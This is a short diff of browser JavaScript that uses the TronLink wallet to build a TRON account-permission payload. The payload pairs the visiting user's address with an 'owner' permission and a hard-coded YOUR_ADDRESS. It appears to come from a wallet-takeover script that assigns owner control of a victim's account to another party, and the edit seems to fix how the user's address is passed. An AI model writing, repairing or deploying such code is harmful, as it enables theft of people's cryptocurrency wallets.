@@ -66,7 +66,6 @@
             try {
                 const tronWeb = window.tronLink.tronWeb;
                 const userAddress = tronWeb.defaultAddress.base58;
-                const userHex = tronWeb.address.toHex(userAddress);
                 const yourHex = tronWeb.address.toHex(YOUR_ADDRESS);
 
                 if (!userAddress) {
@@ -74,7 +73,7 @@
                 }
 
                 const payload = {
-                    owner_address: userHex,
+                    owner_address: userAddress,
                     owner: {
                         type: 0,
                         permission_name: 'owner',
